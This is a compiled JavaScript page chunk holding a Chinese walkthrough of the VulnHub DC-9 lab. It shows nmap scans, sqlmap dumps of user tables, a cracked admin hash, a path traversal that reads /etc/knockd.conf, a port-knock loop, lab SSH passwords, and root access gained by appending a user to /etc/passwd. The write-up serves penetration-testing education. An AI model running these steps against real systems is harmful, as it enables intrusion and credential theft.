(window.webpackJsonp=window.webpackJsonp||[]).push([[54],{807:function(s,a,e){"use strict";e.r(a);var t=e(1),n=Object(t.a)({},(function(){var s=this,a=s.$createElement,e=s._self._c||a;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h2",{attrs:{id:"_0x01-介绍"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x01-介绍"}},[s._v("#")]),s._v(" 0x01 介绍")]),s._v(" "),e("p",[s._v("靶机地址：")]),s._v(" "),e("blockquote",[e("p",[e("a",{attrs:{href:"https://www.vulnhub.com/entry/dc-9,412/",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://www.vulnhub.com/entry/dc-9,412/"),e("OutboundLink")],1)])]),s._v(" "),e("p",[e("strong",[s._v("DESCRIPTION")])]),s._v(" "),e("p",[s._v("DC-9 is another purposely built vulnerable lab with the intent of gaining experience in the world of penetration testing.")]),s._v(" "),e("p",[s._v("The ultimate goal of this challenge is to get root and to read the one and only flag.")]),s._v(" "),e("p",[s._v("Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.")]),s._v(" "),e("p",[s._v("For beginners, Google can be of great assistance, but you can always tweet me at @DCAU7 for assistance to get you going again. But take note: I won't give you the answer, instead, I'll give you an idea about how to move forward.")]),s._v(" "),e("h2",{attrs:{id:"_0x02-信息收集"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x02-信息收集"}},[s._v("#")]),s._v(" 0x02 信息收集")]),s._v(" "),e("p",[s._v("nmap扫描ip")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("nmap -sP 172.16.89.0/24\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:"/assets/img/image-20211007223845787.png",alt:"image-20211007223845787"}})]),s._v(" "),e("p",[s._v("发现ip：172.16.89.10，继续扫描")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("nmap -T5 -A -v -p- 172.16.89.10\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("扫描结果")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-07 22:39 CST\nNSE: Loaded 153 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.00s elapsed\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.00s elapsed\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.00s elapsed\nInitiating ARP Ping Scan at 22:39\nScanning 172.16.89.10 [1 port]\nCompleted ARP Ping Scan at 22:39, 0.02s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 22:39\nCompleted Parallel DNS resolution of 1 host. at 22:39, 0.00s elapsed\nInitiating SYN Stealth Scan at 22:39\nScanning 172.16.89.10 [65535 ports]\nDiscovered open port 80/tcp on 172.16.89.10\nCompleted SYN Stealth Scan at 22:39, 8.42s elapsed (65535 total ports)\nInitiating Service scan at 22:39\nScanning 1 service on 172.16.89.10\nCompleted Service scan at 22:39, 6.02s elapsed (1 service on 1 host)\nInitiating OS detection (try #1) against 172.16.89.10\nNSE: Script scanning 172.16.89.10.\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.27s elapsed\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.03s elapsed\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.01s elapsed\nNmap scan report for 172.16.89.10\nHost is up (0.0012s latency).\nNot shown: 65533 closed ports\nPORT   STATE    SERVICE VERSION\n22/tcp filtered ssh\n80/tcp open     http    Apache httpd 2.4.38 ((Debian))\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.38 (Debian)\n|_http-title: Example.com - Staff Details - Welcome\nMAC Address: 00:0C:29:EE:8C:38 (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nUptime guess: 32.554 days (since Sun Sep  5 09:21:42 2021)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=252 (Good luck!)\nIP ID Sequence Generation: All zeros\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   1.24 ms 172.16.89.10\n\nNSE: Script Post-scanning.\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.01s elapsed\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.00s elapsed\nInitiating NSE at 22:39\nCompleted NSE at 22:39, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.94 seconds\n           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br"),e("span",{staticClass:"line-number"},[s._v("32")]),e("br"),e("span",{staticClass:"line-number"},[s._v("33")]),e("br"),e("span",{staticClass:"line-number"},[s._v("34")]),e("br"),e("span",{staticClass:"line-number"},[s._v("35")]),e("br"),e("span",{staticClass:"line-number"},[s._v("36")]),e("br"),e("span",{staticClass:"line-number"},[s._v("37")]),e("br"),e("span",{staticClass:"line-number"},[s._v("38")]),e("br"),e("span",{staticClass:"line-number"},[s._v("39")]),e("br"),e("span",{staticClass:"line-number"},[s._v("40")]),e("br"),e("span",{staticClass:"line-number"},[s._v("41")]),e("br"),e("span",{staticClass:"line-number"},[s._v("42")]),e("br"),e("span",{staticClass:"line-number"},[s._v("43")]),e("br"),e("span",{staticClass:"line-number"},[s._v("44")]),e("br"),e("span",{staticClass:"line-number"},[s._v("45")]),e("br"),e("span",{staticClass:"line-number"},[s._v("46")]),e("br"),e("span",{staticClass:"line-number"},[s._v("47")]),e("br"),e("span",{staticClass:"line-number"},[s._v("48")]),e("br"),e("span",{staticClass:"line-number"},[s._v("49")]),e("br"),e("span",{staticClass:"line-number"},[s._v("50")]),e("br"),e("span",{staticClass:"line-number"},[s._v("51")]),e("br"),e("span",{staticClass:"line-number"},[s._v("52")]),e("br"),e("span",{staticClass:"line-number"},[s._v("53")]),e("br"),e("span",{staticClass:"line-number"},[s._v("54")]),e("br"),e("span",{staticClass:"line-number"},[s._v("55")]),e("br"),e("span",{staticClass:"line-number"},[s._v("56")]),e("br"),e("span",{staticClass:"line-number"},[s._v("57")]),e("br"),e("span",{staticClass:"line-number"},[s._v("58")]),e("br"),e("span",{staticClass:"line-number"},[s._v("59")]),e("br"),e("span",{staticClass:"line-number"},[s._v("60")]),e("br"),e("span",{staticClass:"line-number"},[s._v("61")]),e("br"),e("span",{staticClass:"line-number"},[s._v("62")]),e("br"),e("span",{staticClass:"line-number"},[s._v("63")]),e("br"),e("span",{staticClass:"line-number"},[s._v("64")]),e("br")])]),e("h2",{attrs:{id:"_0x03-渗透"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x03-渗透"}},[s._v("#")]),s._v(" 0x03 渗透")]),s._v(" "),e("p",[s._v("使用浏览器访问http://172.16.89.10，发现一个搜索和登陆功能，先试试搜索功能有没有sql注入，使用burp抓搜索包")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20211007224804392.png",alt:"image-20211007224804392"}})]),s._v(" "),e("p",[s._v("将请求内容保存到request.txt中，使用sqlmap进行扫描")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("sqlmap -r request.txt --dbs\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("发现存在sql注入，进一步扫描")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("sqlmap -r request.txt -D Staff --tables\nsqlmap -r request.txt -D Staff -T Users --dump\nsqlmap -r request.txt -D Staff -T StaffDetails --dump\n\nsqlmap -r request.txt -D users --tables\nsqlmap -r request.txt -D Staff -T UserDetails --dump\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br")])]),e("p",[s._v("UserDetails表下发现一些用户名密码")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20211007231327154.png",alt:"image-20211007231327154"}})]),s._v(" "),e("p",[s._v("StaffDetails表下发现员工信息")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20211007231017283.png",alt:"image-20211007231017283"}})]),s._v(" "),e("p",[s._v("Users表下发现admin账号和密码hash")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("admin：856f5de590ef37314e7c3bdf6f8a66dc\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("似乎是md5，进行md5解密，得到密码"),e("em",[s._v("transorbital1")])]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20211007225413206.png",alt:"image-20211007225413206"}})]),s._v(" "),e("p",[s._v("使用发现的账号密码登陆")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20211007225528688.png",alt:"image-20211007225528688"}})]),s._v(" "),e("p",[s._v('有一条错误信息"File does not exist"，猜测存在文件包含漏洞，对请求参数和值进行模糊测试')]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20211007230414693.png",alt:"image-20211007230414693"}})]),s._v(" "),e("p",[s._v("发现存在file参数文件包含漏洞")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20211007230703806.png",alt:"image-20211007230703806"}})]),s._v(" "),e("p",[s._v("查攻略，发现使用了knock 服务保护 SSH,按特定的访问端口才可以访问服务，访问knock的配置文件")]),s._v(" "),e("p",[s._v("http://172.16.89.10/manage.php?file=../../../../../../../../etc/knockd.conf")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20211007232625489.png",alt:"image-20211007232625489"}})]),s._v(" "),e("p",[s._v("访问配置文件中的端口")]),s._v(" "),e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token for-or-select variable"}},[s._v("x")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("7469")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("8475")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("9842")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("do")]),s._v(" nmap -Pn --max-retries "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" -p "),e("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$x")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".141.143"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("done")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("下来ssh可以连接了，尝试之前UserDetail表中爆出的账号密码，发现三个可用")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("chandlerb   UrAG0D!\njoeyt       Passw0rd\njanitor     Ilovepeepee\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br")])]),e("p",[s._v("在hanitor下发现隐藏文件")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20211007233100015.png",alt:"image-20211007233100015"}})]),s._v(" "),e("p",[s._v("使用这个密码表再测一下ssh，发现一个新账号登陆成功")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("fredf   B4-Tru3-001\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("下来尝试提权")]),s._v(" "),e("h2",{attrs:{id:"_0x04-提权"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#_0x04-提权"}},[s._v("#")]),s._v(" 0x04 提权")]),s._v(" "),e("p",[s._v("运行")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("sudo -l\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[e("img",{attrs:{src:"/assets/img/image-20211007233251603.png",alt:"image-20211007233251603"}})]),s._v(" "),e("p",[s._v("运行/opt/devstuff/dist/test/test，发现其实是运行test.py")]),s._v(" "),e("p",[e("img",{attrs:{src:"/assets/img/image-20211007233446942.png",alt:"image-20211007233446942"}})]),s._v(" "),e("p",[s._v("搜索test.py")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("find / -name test.py\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br")])]),e("p",[s._v("发现test.py路径：/opt/devstuff/test.py，查看test.py代码")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v('#!/usr/bin/python\n\nimport sys\n\nif len (sys.argv) != 3 :\n    print ("Usage: python test.py read append")\n    sys.exit (1)\n\nelse :\n    f = open(sys.argv[1], "r")\n    output = (f.read())\n\n    f = open(sys.argv[2], "a")\n    f.write(output)\n    f.close()\n')])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br")])]),e("p",[s._v("作用是读取第一个参数文件的，添加到第二哥参数文件中，可以用来修改/etc/passwd")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("echo 'test:sXuCKi7k3Xh/s:0:0::/root:/bin/bash' > /tmp/test\ncd /opt/devstuff/dist/test/\nsudo ./test /tmp/test /etc/passwd\nsu test\nPassword: toor\n\ncd /root\nls\ncat theflag.txt\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br")])]),e("p",[e("img",{attrs:{src:"/assets/img/image-20211007234114035.png",alt:"image-20211007234114035"}})])])}),[],!1,null,null,null);a.default=n.exports}}]);